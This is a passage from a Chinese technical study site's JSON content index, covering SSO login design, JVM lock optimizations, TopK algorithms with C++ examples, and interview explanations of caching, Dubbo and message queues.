跨域登录（主域名已登录）   跨域登录（主域名未登录）   跨域登出  三、备注     关于方案  这次设计方案更多是提供实现思路。如果涉及到APP用户登录等情况，在访问SSO服务时，增加对APP的签名验证就好了。当然，如果有无线网关，验证签名不是问题。\n 关于时序图  时序图中并没有包含所有场景，ken.io只列举了核心/主要场景，另外对于一些不影响理解思路的消息能省就省了。\n"},{"id":311,"href":"/java/multi-thread/synchronized%E5%9C%A8JDK1.6%E4%B9%8B%E5%90%8E%E7%9A%84%E5%BA%95%E5%B1%82%E4%BC%98%E5%8C%96/","title":"synchronized在JDK1.6之后的底层优化","parent":"multi-thread","content":"JDK1.6 对锁的实现引入了大量的优化来减少锁操作的开销，如: 偏向锁、轻量级锁、自旋锁、适应性自旋锁、锁消除、锁粗化 等等技术。\n锁主要存在四中状态，依次是：\n 无锁状态 偏向锁状态 轻量级锁状态 重量级锁状态  锁🔐会随着竞争的激烈而逐渐升级。\n另外，需要注意：锁可以升级不可降级，即 无锁 -\u0026gt; 偏向锁 -\u0026gt; 轻量级锁 -\u0026gt; 重量级锁是单向的。 这种策略是为了提高获得锁和释放锁的效率。\n偏向锁    引入偏向锁的目的和引入轻量级锁的目的很像，他们都是为了没有多线程竞争的前提下，减少传统的重量级锁使用操作系统互斥量产生的性能消耗。但是不同是：轻量级锁在无竞争的情况下使用 CAS 操作去代替使用互斥量。而偏向锁在无竞争的情况下会把整个同步都消除掉。\n偏向锁的“偏”就是偏心的偏，它的意思是会偏向于第一个获得它的线程，如果在接下来的执行中，该锁没有被其他线程获取，那么持有偏向锁的线程就不需要进行同步！（关于偏向锁的原理可以查看《深入理解Java虚拟机：JVM高级特性与最佳实践》第二版的13章第三节锁优化。）\n偏向锁的加锁    当一个线程访问同步块并获取锁时, 会在锁对象的对象头和栈帧中的锁记录里存储锁偏向的线程ID, 以后该线程进入和退出同步块时不需要进行CAS操作来加锁和解锁, 只需要简单的测试一下锁对象的对象头的MarkWord里是否存储着指向当前线程的偏向锁(线程ID是当前线程), 如果测试成功, 表示线程已经获得了锁; 如果测试失败, 则需要再测试一下MarkWord中偏向锁的标识是否设置成1(表示当前是偏向锁), 如果没有设置, 则使用CAS竞争锁, 如果设置了, 则尝试使用CAS将锁对象的对象头的偏向锁指向当前线程.\n偏向锁的撤销    偏向锁使用了一种等到竞争出现才释放锁的机制, 所以当其他线程尝试竞争偏向锁时, 持有偏向锁的线程才会释放锁. 偏向锁的撤销需要等到全局安全点(在这个时间点上没有正在执行的字节码). 首先会暂停持有偏向锁的线程, 然后检查持有偏向锁的线程是否存活, 如果线程不处于活动状态, 则将锁对象的对象头设置为无锁状态; 如果线程仍然活着, 则锁对象的对象头中的MarkWord和栈中的锁记录要么重新偏向于其它线程要么恢复到无锁状态, 最后唤醒暂停的线程(释放偏向锁的线程).\n但是对于锁竞争比较激烈的场合，偏向锁就失效了，因为这样场合极有可能每次申请锁的线程都是不相同的，因此这种场合下不应该使用偏向锁，否则会得不偿失，需要注意的是，偏向锁失败后，并不会立即膨胀为重量级锁，而是先升级为轻量级锁。\n轻量级锁    倘若偏向锁失败，虚拟机并不会立即升级为重量级锁，它还会尝试使用一种称为轻量级锁的优化手段(1.6之后加入的)。轻量级锁不是为了代替重量级锁，它的本意是在没有多线程竞争的前提下，减少传统的重量级锁使用操作系统互斥量产生的性能消耗，因为使用轻量级锁时，不需要申请互斥量。另外，轻量级锁的加锁和解锁都用到了CAS操作。 关于轻量级锁的加锁和解锁的原理可以查看《深入理解Java虚拟机：JVM高级特性与最佳实践》第二版的13章第三节锁优化。\n轻量级锁能够提升程序同步性能的依据是“对于绝大部分锁，在整个同步周期内都是不存在竞争的”，这是一个经验数据。如果没有竞争，轻量级锁使用 CAS 操作避免了使用互斥操作的开销。但如果存在锁竞争，除了互斥量开销外，还会额外发生CAS操作，因此在有锁竞争的情况下，轻量级锁比传统的重量级锁更慢！如果锁竞争激烈，那么轻量级将很快膨胀为重量级锁！\n自旋锁和自适应自旋    轻量级锁失败后，虚拟机为了避免线程真实地在操作系统层面挂起，还会进行一项称为自旋锁的优化手段。\n互斥同步对性能最大的影响就是阻塞的实现，因为挂起线程/恢复线程的操作都需要转入内核态中完成（用户态转换到内核态会耗费时间）。\n一般线程持有锁的时间都不是太长，所以仅仅为了这一点时间去挂起线程/恢复线程是得不偿失的。 所以，虚拟机的开发团队就这样去考虑：“我们能不能让后面来的请求获取锁的线程等待一会而不被挂起呢？看看持有锁的线程是否很快就会释放锁”。为了让一个线程等待，我们只需要让线程执行一个忙循环（自旋），这项技术就叫做自旋。\n百度百科对自旋锁的解释：\n 何谓自旋锁？它是为实现保护共享资源而提出一种锁机制。其实，自旋锁与互斥锁比较类似，它们都是为了解决对某项资源的互斥使用。无论是互斥锁，还是自旋锁，在任何时刻，最多只能有一个保持者，也就说，在任何时刻最多只能有一个执行单元获得锁。但是两者在调度机制上略有不同。对于互斥锁，如果资源已经被占用，资源申请者只能进入睡眠状态。但是自旋锁不会引起调用者睡眠，如果自旋锁已经被别的执行单元保持，调用者就一直循环在那里看是否该自旋锁的保持者已经释放了锁，\u0026ldquo;自旋\u0026quot;一词就是因此而得名。\n 自旋锁在 JDK1.6 之前其实就已经引入了，不过是默认关闭的，需要通过--XX:+UseSpinning参数来开启。JDK1.6及1.6之后，就改为默认开启的了。需要注意的是：自旋等待不能完全替代阻塞，因为它还是要占用处理器时间。如果锁被占用的时间短，那么效果当然就很好了！反之，相反！自旋等待的时间必须要有限度。如果自旋超过了限定次数任然没有获得锁，就应该挂起线程。自旋次数的默认值是10次，用户可以修改--XX:PreBlockSpin来更改。\n另外,在 JDK1.6 中引入了自适应的自旋锁。自适应的自旋锁带来的改进就是：自旋的时间不在固定了，而是和前一次同一个锁上的自旋时间以及锁的拥有者的状态来决定，虚拟机变得越来越“聪明”了。\n锁消除    锁消除理解起来很简单，它指的就是虚拟机即使编译器在运行时，如果检测到那些共享数据不可能存在竞争，那么就执行锁消除。锁消除可以节省毫无意义的请求锁的时间。\n锁粗化    原则上，我们在编写代码的时候，总是推荐将同步块的作用范围限制得尽量小，——只在共享数据的实际作用域才进行同步，这样是为了使得需要同步的操作数量尽可能变小，如果存在锁竞争，那等待线程也能尽快拿到锁。\n大部分情况下，上面的原则都是没有问题的，但是如果一系列的连续操作都对同一个对象反复加锁和解锁，那么会带来很多不必要的性能消耗。\n"},{"id":312,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/topk-problems-and-solutions/","title":"topk-problems-and-solutions","parent":"大数据","content":"大数据中 TopK 问题的常用套路     作者 Chunel Feng，编程爱好者，阿里巴巴搜索引擎开发工程师。\n个人微信：ChunelFeng 个人博客：一面之猿网 开源项目：Caiss 智能相似搜索引擎\n Doocs 社区的朋友们，大家好。我是你们的新朋友 Chunel Feng。今天想跟大家聊一些常见的 topK 问题。\n对于海量数据到处理经常会涉及到 topK 问题。在设计数据结构和算法的时候，主要需要考虑的应该是当前算法（包括数据结构）跟给定情境（比如数据量级、数据类型）的适配程度，和当前问题最核心的瓶颈（如降低时间复杂度，还是降低空间复杂度）是什么。\n首先，我们来举几个常见的 topK 问题的例子：\n 给定 100 个 int 数字，在其中找出最大的 10 个； 给定 10 亿个 int 数字，在其中找出最大的 10 个（这 10 个数字可以无序）； 给定 10 亿个 int 数字，在其中找出最大的 10 个（这 10 个数字依次排序）； 给定 10 亿个不重复的 int 数字，在其中找出最大的 10 个； 给定 10 个数组，每个数组中有 1 亿个 int 数字，在其中找出最大的 10 个； 给定 10 亿个 string 类型的数字，在其中找出最大的 10 个（仅需要查 1 次）； 给定 10 亿个 string 类型的数字，在其中找出最大的 k 个（需要反复多次查询，其中 k 是一个随机数字）。  上面这些问题看起来很相似，但是解决的方式却千差万别。稍有不慎，就可能使得 topK 问题成为系统的瓶颈。不过也不用太担心，接下来我会总结几种常见的解决思路，遇到问题的时候，大家把这些基础思路融会贯通并且杂糅组合，即可做到见招拆招。 1. 堆排序法    这里说的是堆排序法，而不是快排或者希尔排序。虽然理论时间复杂度都是 O(nlogn)，但是堆排在做 topK 的时候有一个优势，就是可以维护一个仅包含 k 个数字的小顶堆（想清楚，为啥是小顶堆哦），当新加入的数字大于堆顶数字的时候，将堆顶元素剔除，并加入新的数字。\n用 C++ 来说明，堆在 stl 中是 priority_queue（不是 set）。\nint main() { const int topK = 3; vector\u0026lt;int\u0026gt; vec = {4,1,5,8,7,2,3,0,6,9}; priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;\u0026gt;\u0026gt; pq; // 小顶堆  for (const auto\u0026amp; x : vec) { pq.push(x); if (pq.size() \u0026gt; topK) { // 如果超出个数，则弹出堆顶（最小的）数据  pq.pop(); } } while (!pq.empty()) { cout \u0026lt;\u0026lt; pq.top() \u0026lt;\u0026lt; endl; // 输出依次为7,8,9  pq.pop(); } return 0; }  Java 中同样提供了 PriorityQueue 的数据结构。\n 2. 类似快排法    快排大家都知道，针对 topK 问题，可以对快排进行改进。仅对部分数据进行递归计算。比如，在 100 个数字中，找最大的 10 个，第一次循环的时候，povit 被移动到了 80 的位置，则接下来仅需要在后面的 20 个数字中找最大的 10 个即可。\n这样做的优势是，理论最优时间复杂度可以达到 O(n)，不过平均时间复杂度还是 O(nlogn)。需要说明的是，通过这种方式，找出来的最大的 k 个数字之间，是无序的。\nint partition(vector\u0026lt;int\u0026gt;\u0026amp; arr, int begin, int end) { int left = begin; int right = end; int povit = arr[begin]; while (left \u0026lt; right) { while (left \u0026lt; right \u0026amp;\u0026amp; arr[right] \u0026gt;= povit) {right--;} while (left \u0026lt; right \u0026amp;\u0026amp; arr[left] \u0026lt;= povit) {left++;} if (left \u0026lt; right) {swap(arr[left], arr[right]);} } swap(arr[begin], arr[left]); return left; } void partSort(vector\u0026lt;int\u0026gt;\u0026amp; arr, int begin, int end, int target) { if (begin \u0026gt;= end) { return; } int povit = partition(arr, begin, end); if (target \u0026lt; povit) { partSort(arr, begin, povit - 1, target); } else if (target \u0026gt; povit) { partSort(arr, povit + 1, end, target); } } vector\u0026lt;int\u0026gt; getMaxNumbers(vector\u0026lt;int\u0026gt;\u0026amp; arr, int k) { int size = (int)arr.size(); // 把求最大的k个数，转换成求最小的size-k个数字  int target = size - k; partSort(arr, 0, size - 1, target); vector\u0026lt;int\u0026gt; ret(arr.end() - k, arr.end()); return ret; } int main() { vector\u0026lt;int\u0026gt; vec = {4,1,5,8,7,2,3,0,6,9}; auto ret = getMaxNumbers(vec, 3); for (auto x : ret) { cout \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; // 输出7，8，9（理论上无序）  } return 0; } \n3. 使用 bitmap    有时候 topK 问题会遇到数据量过大，内存无法全部加载。这个时候，可以考虑将数据存放至 bitmap 中，方便查询。\n比如，给出 10 个 int 类型的数据，分别是【13，12，11，1，2，3，4，5，6，7】，int 类型的数据每个占据 4 个字节，那这个数组就占据了 40 个字节。现在，把它们放到一个 16 个长度 bool 的 bitmap 中，结果就是【0，1，1，1，1，1，1，1，0，0，0，1，1，1，0，0】，在将空间占用降低至 4 字节的同时，也可以很方便的看出，最大的 3 个数字，分别是 11，12 和 13。\n需要说明的是，bitmap 结合跳表一起使用往往有奇效。比如以上数据还可以记录成：从第 1 位开始，有连续 7 个 1；从第 11 位开始，有连续 3 个 1。这样做，空间复杂度又得到了进一步的降低。\n这种做法的优势，当然是降低了空间复杂度。不过需要注意一点，bitmap 比较适合不重复且有范围（比如，数据均在 0 ～ 10 亿之间）的数据的查询。至于有重复数据的情况，可以考虑与 hash 等结构的混用。 4. 使用 hash    如果遇到了查询 string 类型数据的大小，可以考虑 hash 方法。\n举个例子，10 个 string 数字【\u0026ldquo;1001\u0026rdquo;，\u0026ldquo;23\u0026rdquo;，\u0026ldquo;1002\u0026rdquo;，\u0026ldquo;3003\u0026rdquo;，\u0026ldquo;2001\u0026rdquo;，\u0026ldquo;1111\u0026rdquo;，\u0026ldquo;65\u0026rdquo;，\u0026ldquo;834\u0026rdquo;，\u0026ldquo;5\u0026rdquo;，\u0026ldquo;987\u0026rdquo;】找最大的 3 个。我们先通过长度进行 hash，得到长度最大为 4，且有 5 个长度为 4 的 string。接下来再通过最高位值做 hash，发现有 1 个最高位为\u0026quot;3\u0026quot;的，1 个为\u0026quot;2\u0026quot;的，3 个为\u0026quot;1\u0026quot;的。接下来，可以通过再设计 hash 函数，或者是循环的方式，在 3 个最高位为\u0026quot;1\u0026quot;的 string 中找到最大的一个，即可找到 3 个最值大的数据。\n这种方法比较适合网址或者电话号码的查询。缺点就是如果需要多次查询的话，需要多次计算 hash，并且需要根据实际情况设计多个 hash 函数。 5. 字典树    字典树（trie）的具体结构和查询方式，不在这里赘述了，自行百度一下就有很多。这里主要说一下优缺点。\n字典树的思想，还是通过前期建立索引信息，后期可以反复多次查询，并且后期增删数据也很方便。比较适合于需要反复多次查询的情况。\n比如，反复多次查询字符序（例如：z\u0026gt;y\u0026gt;\u0026hellip;\u0026gt;b\u0026gt;a）最大的 k 个 url 这种，使用字典树把数据存储一遍，就非常适合。既减少了空间复杂度，也加速了查询效率。 6. 混合查询    以上几种方法，都是比较独立的方法。其实，在实际工作中，遇到更多的问题还是混合问题，这就需要我们对相关的内容，融会贯通并且做到活学活用。\n我举个例子：我们的分布式服务跑在 10 台不同机器上，每台机器上部署的服务均被请求 10000 次，并且记录了个这 10000 次请求的耗时（耗时值为 int 数据），找出这 10*10000 次请求中，从高到低的找出耗时最大的 50 个。看看这个问题，很现实吧。我们试着用上面介绍的方法，组合一下来求解。\n方法一    首先，对每台机器上的 10000 个做类似快排，找出每台机器上 top50 的耗时信息。此时，单机上的这 50 条数据是无序的。\n然后，再将 10 台机器上的 50 条数据（共 500 条）放到一起，再做一次类似快排，找到最大的 50 个（此时应该这 50 个应该是无序的）。\n最后，对这 50 个数据做快排，从而得到最终结果。\n方法二    首先通过堆排，分别找出 10 台机器上耗时最高的 50 个数据，此时的这 50 个数据，已经是从大到小有序的了。\n然后，我们依次取出 10 台机器中，耗时最高的 5 条放入小顶堆中。\n最后，遍历 10 台机器上的数据，每台机器从第 6 个数据开始往下循环，如果这个值比堆顶的数据大，则抛掉堆顶数据并且把它加入，继续用下一个值进行同样比较。如果这个值比堆顶的值小，则结束当前循环，并且在下一台机器上做同样操作。\n以上我介绍了两种方法，并不是为了说明哪种方法更好，或者时间复杂度更低。而是想说同样的事情有多种不同的解决方法，而且随着数据量的增加，可能会需要更多组合形式。在这个领域，数据决定了数据结构，数据结构决定了算法。\n没有最好的方法，只有不断找寻更好的方法的程序员。适合的，才会是最好的。\n嗯，加油，你可以找到更好的！！！\n"},{"id":313,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/why-cache/","title":"why-cache","parent":"高并发","content":"面试题    项目中缓存是如何使用的？为什么要用缓存？缓存使用不当会造成什么后果？\n面试官心理分析    这个问题，互联网公司必问，要是一个人连缓存都不太清楚，那确实比较尴尬。\n只要问到缓存，上来第一个问题，肯定是先问问你项目哪里用了缓存？为啥要用？不用行不行？如果用了以后可能会有什么不良的后果？\n这就是看看你对缓存这个东西背后有没有思考，如果你就是傻乎乎的瞎用，没法给面试官一个合理的解答，那面试官对你印象肯定不太好，觉得你平时思考太少，就知道干活儿。\n面试题剖析    项目中缓存是如何使用的？    这个，需要结合自己项目的业务来。\n为什么要用缓存？    用缓存，主要有两个用途：高性能、高并发。\n高性能    假设这么个场景，你有个操作，一个请求过来，吭哧吭哧你各种乱七八糟操作 mysql，半天查出来一个结果，耗时 600ms。但是这个结果可能接下来几个小时都不会变了，或者变了也可以不用立即反馈给用户。那么此时咋办？\n缓存啊，折腾 600ms 查出来的结果，扔缓存里，一个 key 对应一个 value，下次再有人查，别走 mysql 折腾 600ms 了，直接从缓存里，通过一个 key 查出来一个 value，2ms 搞定。性能提升 300 倍。\n就是说对于一些需要复杂操作耗时查出来的结果，且确定后面不怎么变化，但是有很多读请求，那么直接将查询出来的结果放在缓存中，后面直接读缓存就好。\n高并发    mysql 这么重的数据库，压根儿设计不是让你玩儿高并发的，虽然也可以玩儿，但是天然支持不好。mysql 单机支撑到 2000QPS 也开始容易报警了。\n所以要是你有个系统，高峰期一秒钟过来的请求有 1 万，那一个 mysql 单机绝对会死掉。你这个时候就只能上缓存，把很多数据放缓存，别放 mysql。缓存功能简单，说白了就是 key-value 式操作，单机支撑的并发量轻松一秒几万十几万，支撑高并发 so easy。单机承载并发量是 mysql 单机的几十倍。\n 缓存是走内存的，内存天然就支撑高并发。\n 用了缓存之后会有什么不良后果？    常见的缓存问题有以下几个：\n 缓存与数据库双写不一致 缓存雪崩、缓存穿透、缓存击穿 缓存并发竞争  点击超链接，可直接查看缓存相关问题及解决方案。\n"},{"id":314,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/why-dubbo/","title":"why-dubbo","parent":"分布式系统","content":"面试题    为什么要进行系统拆分？如何进行系统拆分？拆分后不用 dubbo 可以吗？\n面试官心理分析    从这个问题开始就进行分布式系统环节了，现在出去面试分布式都成标配了，没有哪个公司不问问你分布式的事儿。你要是不会分布式的东西，简直这简历没法看，没人会让你去面试。\n其实为啥会这样呢？这就是因为整个大行业技术发展的原因。\n早些年，印象中在 2010 年初的时候，整个 IT 行业，很少有人谈分布式，更不用说微服务，虽然很多 BAT 等大型公司，因为系统的复杂性，很早就是分布式架构，大量的服务，只不过微服务大多基于自己搞的一套框架来实现而已。\n但是确实，那个年代，大家很重视 ssh2，很多中小型公司几乎大部分都是玩儿 struts2、spring、hibernate，稍晚一些，才进入了 spring mvc、spring、mybatis 的组合。那个时候整个行业的技术水平就是那样，当年 oracle 很火，oracle 管理员很吃香，oracle 性能优化啥的都是 IT 男的大杀招啊。连大数据都没人提，当年 OCP、OCM 等认证培训机构，火的不行。\n但是确实随着时代的发展，慢慢的，很多公司开始接受分布式系统架构了，这里面尤为对行业有至关重要影响的，是阿里的 dubbo，某种程度上而言，阿里在这里推动了行业技术的前进。\n正是因为有阿里的 dubbo，很多中小型公司才可以基于 dubbo，来把系统拆分成很多的服务，每个人负责一个服务，大家的代码都没有冲突，服务可以自治，自己选用什么技术都可以，每次发布如果就改动一个服务那就上线一个服务好了，不用所有人一起联调，每次发布都是几十万行代码，甚至几百万行代码了。\n直到今日，很高兴看到分布式系统都成行业面试标配了，任何一个普通的程序员都该掌握这个东西，其实这是行业的进步，也是所有 IT 码农的技术进步。所以既然分布式都成标配了，那么面试官当然会问了，因为很多公司现在都是分布式、微服务的架构，那面试官当然得考察考察你了。\n面试题剖析    为什么要将系统进行拆分？    网上查查，答案极度零散和复杂，很琐碎，原因一大坨。但是我这里给大家直观的感受：\n要是不拆分，一个大系统几十万行代码，20 个人维护一份代码，简直是悲剧啊。代码经常改着改着就冲突了，各种代码冲突和合并要处理，非常耗费时间；经常我改动了我的代码，你调用了我的，导致你的代码也得重新测试，麻烦的要死；然后每次发布都是几十万行代码的系统一起发布，大家得一起提心吊胆准备上线，几十万行代码的上线，可能每次上线都要做很多的检查，很多异常问题的处理，简直是又麻烦又痛苦；而且如果我现在打算把技术升级到最新的 spring 版本，还不行，因为这可能导致你的代码报错，我不敢随意乱改技术。\n假设一个系统是 20 万行代码，其中 A 在里面改了 1000 行代码，但是此时发布的时候是这个 20 万行代码的大系统一块儿发布。就意味着 20 万上代码在线上就可能出现各种变化，20 个人，每个人都要紧张地等在电脑面前，上线之后，检查日志，看自己负责的那一块儿有没有什么问题。\nA 就检查了自己负责的 1 万行代码对应的功能，确保 ok 就闪人了；结果不巧的是，A 上线的时候不小心修改了线上机器的某个配置，导致另外 B 和 C 负责的 2 万行代码对应的一些功能，出错了。\n几十个人负责维护一个几十万行代码的单块应用，每次上线，准备几个礼拜，上线 -\u0026gt; 部署 -\u0026gt; 检查自己负责的功能。\n拆分了以后，整个世界清爽了，几十万行代码的系统，拆分成 20 个服务，平均每个服务就 1~2 万行代码，每个服务部署到单独的机器上。20 个工程，20 个 git 代码仓库，20 个开发人员，每个人维护自己的那个服务就可以了，是自己独立的代码，跟别人没关系。再也没有代码冲突了，爽。每次就测试我自己的代码就可以了，爽。每次就发布我自己的一个小服务就可以了，爽。技术上想怎么升级就怎么升级，保持接口不变就可以了，真爽。\n所以简单来说，一句话总结，如果是那种代码量多达几十万行的中大型项目，团队里有几十个人，那么如果不拆分系统，开发效率极其低下，问题很多。但是拆分系统之后，每个人就负责自己的一小部分就好了，可以随便玩儿随便弄。分布式系统拆分之后，可以大幅度提升复杂系统大型团队的开发效率。\n但是同时，也要提醒的一点是，系统拆分成分布式系统之后，大量的分布式系统面临的问题也是接踵而来，所以后面的问题都是在围绕分布式系统带来的复杂技术挑战在说。\n如何进行系统拆分？    这个问题说大可以很大，可以扯到领域驱动模型设计上去，说小了也很小，我不太想给大家太过于学术的说法，因为你也不可能背这个答案，过去了直接说吧。还是说的简单一点，大家自己到时候知道怎么回答就行了。\n系统拆分为分布式系统，拆成多个服务，拆成微服务的架构，是需要拆很多轮的。并不是说上来一个架构师一次就给拆好了，而以后都不用拆。\n第一轮；团队继续扩大，拆好的某个服务，刚开始是 1 个人维护 1 万行代码，后来业务系统越来越复杂，这个服务是 10 万行代码，5 个人；第二轮，1 个服务 -\u0026gt; 5 个服务，每个服务 2 万行代码，每人负责一个服务。\n如果是多人维护一个服务，最理想的情况下，几十个人，1 个人负责 1 个或 2~3 个服务；某个服务工作量变大了，代码量越来越多，某个同学，负责一个服务，代码量变成了 10 万行了，他自己不堪重负，他现在一个人拆开，5 个服务，1 个人顶着，负责 5 个人，接着招人，2 个人，给那个同学带着，3 个人负责 5 个服务，其中 2 个人每个人负责 2 个服务，1 个人负责 1 个服务。\n个人建议，一个服务的代码不要太多，1 万行左右，两三万撑死了吧。\n大部分的系统，是要进行多轮拆分的，第一次拆分，可能就是将以前的多个模块该拆分开来了，比如说将电商系统拆分成订单系统、商品系统、采购系统、仓储系统、用户系统，等等吧。\n但是后面可能每个系统又变得越来越复杂了，比如说采购系统里面又分成了供应商管理系统、采购单管理系统，订单系统又拆分成了购物车系统、价格系统、订单管理系统。\n扯深了实在很深，所以这里先给大家举个例子，你自己感受一下，核心意思就是根据情况，先拆分一轮，后面如果系统更复杂了，可以继续分拆。你根据自己负责系统的例子，来考虑一下就好了。\n拆分后不用 dubbo 可以吗？    当然可以了，大不了最次，就是各个系统之间，直接基于 spring mvc，就纯 http 接口互相通信呗，还能咋样。但是这个肯定是有问题的，因为 http 接口通信维护起来成本很高，你要考虑超时重试、负载均衡等等各种乱七八糟的问题，比如说你的订单系统调用商品系统，商品系统部署了 5 台机器，你怎么把请求均匀地甩给那 5 台机器？这不就是负载均衡？你要是都自己搞那是可以的，但是确实很痛苦。\n所以 dubbo 说白了，是一种 rpc 框架，就是说本地就是进行接口调用，但是 dubbo 会代理这个调用请求，跟远程机器网络通信，给你处理掉负载均衡、服务实例上下线自动感知、超时重试等等乱七八糟的问题。那你就不用自己做了，用 dubbo 就可以了。\n"},{"id":315,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/why-mq/","title":"why-mq","parent":"高并发","content":"面试题     为什么使用消息队列？ 消息队列有什么优点和缺点？ Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？  面试官心理分析    其实面试官主要是想看看：\n 第一，你知不知道你们系统里为什么要用消息队列这个东西？\n  不少候选人，说自己项目里用了 Redis、MQ，但是其实他并不知道自己为什么要用这个东西。其实说白了，就是为了用而用，或者是别人设计的架构，他从头到尾都没思考过。\n没有对自己的架构问过为什么的人，一定是平时没有思考的人，面试官对这类候选人印象通常很不好。因为面试官担心你进了团队之后只会木头木脑的干呆活儿，不会自己思考。\n 第二，你既然用了消息队列这个东西，你知不知道用了有什么好处\u0026amp;坏处？\n  你要是没考虑过这个，那你盲目弄个 MQ 进系统里，后面出了问题你是不是就自己溜了给公司留坑？你要是没考虑过引入一个技术可能存在的弊端和风险，面试官把这类候选人招进来了，基本可能就是挖坑型选手。就怕你干 1 年挖一堆坑，自己跳槽了，给公司留下无穷后患。\n 第三，既然你用了 MQ，可能是某一种 MQ，那么你当时做没做过调研？\n  你别傻乎乎的自己拍脑袋看个人喜好就瞎用了一个 MQ，比如 Kafka，甚至都从没调研过业界流行的 MQ 到底有哪几种。每一个 MQ 的优点和缺点是什么。每一个 MQ 没有绝对的好坏，但是就是看用在哪个场景可以扬长避短，利用其优势，规避其劣势。\n如果是一个不考虑技术选型的候选人招进了团队，leader 交给他一个任务，去设计个什么系统，他在里面用一些技术，可能都没考虑过选型，最后选的技术可能并不一定合适，一样是留坑。\n面试题剖析    为什么使用消息队列    其实就是问问你消息队列都有哪些使用场景，然后你项目里具体是什么场景，说说你在这个场景里用消息队列是什么？\n面试官问你这个问题，期望的一个回答是说，你们公司有个什么业务场景，这个业务场景有个什么技术挑战，如果不用 MQ 可能会很麻烦，但是你现在用了 MQ 之后带给了你很多的好处。\n先说一下消息队列常见的使用场景吧，其实场景有很多，但是比较核心的有 3 个：解耦、异步、削峰。\n解耦    看这么个场景。A 系统发送数据到 BCD 三个系统，通过接口调用发送。如果 E 系统也要这个数据呢？那如果 C 系统现在不需要了呢？A 系统负责人几乎崩溃\u0026hellip;\u0026hellip;\n在这个场景中，A 系统跟其它各种乱七八糟的系统严重耦合，A 系统产生一条比较关键的数据，很多系统都需要 A 系统将这个数据发送过来。A 系统要时时刻刻考虑 BCDE 四个系统如果挂了该咋办？要不要重发，要不要把消息存起来？头发都白了啊！\n如果使用 MQ，A 系统产生一条数据，发送到 MQ 里面去，哪个系统需要数据自己去 MQ 里面消费。如果新系统需要数据，直接从 MQ 里消费即可；如果某个系统不需要这条数据了，就取消对 MQ 消息的消费即可。这样下来，A 系统压根儿不需要去考虑要给谁发送数据，不需要维护这个代码，也不需要考虑人家是否调用成功、失败超时等情况。\n总结：通过一个 MQ，Pub/Sub 发布订阅消息这么一个模型，A 系统就跟其它系统彻底解耦了。\n面试技巧：你需要去考虑一下你负责的系统中是否有类似的场景，就是一个系统或者一个模块，调用了多个系统或者模块，互相之间的调用很复杂，维护起来很麻烦。但是其实这个调用是不需要直接同步调用接口的，如果用 MQ 给它异步化解耦，也是可以的，你就需要去考虑在你的项目里，是不是可以运用这个 MQ 去进行系统的解耦。在简历中体现出来这块东西，用 MQ 作解耦。\n异步    再来看一个场景，A 系统接收一个请求，需要在自己本地写库，还需要在 BCD 三个系统写库，自己本地写库要 3ms，BCD 三个系统分别写库要 300ms、450ms、200ms。最终请求总延时是 3 + 300 + 450 + 200 = 953ms，接近 1s，用户感觉搞个什么东西，慢死了慢死了。用户通过浏览器发起请求，等待个 1s，这几乎是不可接受的。\n一般互联网类的企业，对于用户直接的操作，一般要求是每个请求都必须在 200 ms 以内完成，对用户几乎是无感知的。\n如果使用 MQ，那么 A 系统连续发送 3 条消息到 MQ 队列中，假如耗时 5ms，A 系统从接受一个请求到返回响应给用户，总时长是 3 + 5 = 8ms，对于用户而言，其实感觉上就是点个按钮，8ms 以后就直接返回了，爽！网站做得真好，真快！\n削峰    每天 0:00 到 12:00，A 系统风平浪静，每秒并发请求数量就 50 个。结果每次一到 12:00 ~ 13:00 ，每秒并发请求数量突然会暴增到 5k+ 条。但是系统是直接基于 MySQL 的，大量的请求涌入 MySQL，每秒钟对 MySQL 执行约 5k 条 SQL。\n一般的 MySQL，扛到每秒 2k 个请求就差不多了，如果每秒请求到 5k 的话，可能就直接把 MySQL 给打死了，导致系统崩溃，用户也就没法再使用系统了。\n但是高峰期一过，到了下午的时候，就成了低峰期，可能也就 1w 的用户同时在网站上操作，每秒中的请求数量可能也就 50 个请求，对整个系统几乎没有任何的压力。\n如果使用 MQ，每秒 5k 个请求写入 MQ，A 系统每秒钟最多处理 2k 个请求，因为 MySQL 每秒钟最多处理 2k 个。A 系统从 MQ 中慢慢拉取请求，每秒钟就拉取 2k 个请求，不要超过自己每秒能处理的最大请求数量就 ok，这样下来，哪怕是高峰期的时候，A 系统也绝对不会挂掉。而 MQ 每秒钟 5k 个请求进来，就 2k 个请求出去，结果就导致在中午高峰期（1 个小时），可能有几十万甚至几百万的请求积压在 MQ 中。\n这个短暂的高峰期积压是 ok 的，因为高峰期过了之后，每秒钟就 50 个请求进 MQ，但是 A 系统依然会按照每秒 2k 个请求的速度在处理。所以说，只要高峰期一过，A 系统就会快速将积压的消息给解决掉。\n消息队列有什么优缺点    优点上面已经说了，就是在特殊场景下有其对应的好处，解耦、异步、削峰。\n缺点有以下几个：\n 系统可用性降低\n  系统引入的外部依赖越多，越容易挂掉。本来你就是 A 系统调用 BCD 三个系统的接口就好了，ABCD 四个系统还好好的，没啥问题，你偏加个 MQ 进来，万一 MQ 挂了咋整？MQ 一挂，整套系统崩溃，你不就完了？如何保证消息队列的高可用，可以点击这里查看。\n 系统复杂度提高\n  硬生生加个 MQ 进来，你怎么保证消息没有重复消费？怎么处理消息丢失的情况？怎么保证消息传递的顺序性？头大头大，问题一大堆，痛苦不已。\n 一致性问题\n  A 系统处理完了直接返回成功了，人都以为你这个请求就成功了；但是问题是，要是 BCD 三个系统那里，BD 两个系统写库成功了，结果 C 系统写库失败了，咋整？你这数据就不一致了。\n所以消息队列实际是一种非常复杂的架构，你引入它有很多好处，但是也得针对它带来的坏处做各种额外的技术方案和架构来规避掉，做好之后，你会发现，妈呀，系统复杂度提升了一个数量级，也许是复杂了 10 倍。但是关键时刻，用，还是得用的。\nKafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点？       特性 ActiveMQ RabbitMQ RocketMQ Kafka     单机吞吐量 万级，比 RocketMQ、Kafka 低一个数量级 同 ActiveMQ 10 万级，支撑高吞吐 10 万级，高吞吐，一般配合大数据类的系统来进行实时数据计算、日志采集等场景   